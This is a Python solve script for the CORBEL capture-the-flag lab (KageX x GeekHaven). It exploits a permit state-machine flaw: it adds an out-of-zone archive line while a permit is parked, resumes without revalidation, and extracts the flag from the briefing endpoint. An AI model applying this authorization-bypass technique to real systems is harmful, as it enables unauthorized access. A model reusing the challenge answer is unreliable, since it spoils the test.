#!/usr/bin/env python3
"""Solve CORBEL (KageX x GeekHaven).

The permit state machine allows lines to be added while a permit is parked.
Resuming re-issues the permit without revalidating that the countersigning
officer's zone covers every line. Sign a yard-only permit, park it, add the
archive point D7, resume, then read the toolbox talk's access note.

Usage:
    python solve.py https://<lab-host>
"""
import re
import sys
import time

import requests

FLAG_RE = re.compile(r"FLAG\{[^}]+\}")


def post(session: requests.Session, host: str, path: str, payload=None):
    url = host.rstrip("/") + path
    for attempt in range(5):
        try:
            r = session.post(url, json=payload or {}, timeout=120)
            return r
        except requests.RequestException:
            if attempt == 4:
                raise
            time.sleep(1.5)


def main() -> int:
    if len(sys.argv) != 2:
        print(__doc__)
        return 2
    host = sys.argv[1]
    s = requests.Session()

    steps = [
        ("reset", "/reset", {}),
        ("add yard line BAY2", "/permit/line", {"point": "BAY2", "task": "Inspect racking"}),
        ("countersign with yard officer", "/permit/countersign", {"officer": "H. Chaudhari"}),
        ("issue", "/permit/issue", {}),
        ("park", "/permit/park", {}),
        ("add archive line D7 while parked", "/permit/line", {"point": "D7", "task": "Inspect muniment store"}),
        ("resume", "/permit/resume", {}),
    ]

    for label, path, payload in steps:
        r = post(s, host, path, payload)
        try:
            data = r.json()
        except ValueError:
            print(f"[!] {label}: HTTP {r.status_code}: {r.text[:300]}")
            return 1
        permit = data.get("permit") or {}
        print(f"[+] {label}: HTTP {r.status_code} state={permit.get('state')} "
              f"lines={[(l['point'], l['zone']) for l in permit.get('lines', [])]}")
        if not r.ok:
            print(f"    note: {data.get('note') or data.get('error')}")

    r = post(s, host, "/brief", {"note": ""})
    data = r.json()
    talk = data.get("talk") or ""
    print("\n--- toolbox talk ---")
    print(talk)

    match = FLAG_RE.search(talk) or FLAG_RE.search(r.text)
    if match:
        print(f"\n[CONFIRMED FLAG] {match.group(0)}")
        print(f"solved={data.get('solved')}")
        return 0

    print("\n[-] No flag in talk; raw response follows:")
    print(r.text)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
